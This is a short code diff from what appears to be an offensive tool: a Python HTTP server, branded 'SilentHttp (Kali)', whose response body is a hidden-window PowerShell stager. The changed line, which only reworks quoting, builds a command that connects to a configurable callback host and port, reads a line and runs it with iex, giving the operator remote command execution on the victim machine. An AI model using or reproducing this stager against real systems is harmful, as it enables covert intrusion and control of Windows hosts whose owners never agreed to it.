@@ -72,7 +72,7 @@ class HTTPServer:
                 return data == correct_request
 
         def get_response(self):
-                content                 = """powershell -wi h -c 'start powershell -wi h -arg {$t=[net.sockets.tcpclient]::new(\"""" + self.callback_address + "\"," + str(self.callback_port) + ");[io.streamreader]::new($t.getstream()).readline()|iex}'"""
+                content                 = """powershell -wi h -c "start powershell -wi h -arg {`$t=[net.sockets.tcpclient]::new('""" + self.callback_address + "'," + str(self.callback_port) + ");[io.streamreader]::new(`$t.getstream()).readline()|iex}\""""
                 http_response           = "HTTP/1.0 200 OK"
                 http_server             = "Server: SilentHttp/1.0.0 (Kali)"
                 date_now                = time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime())
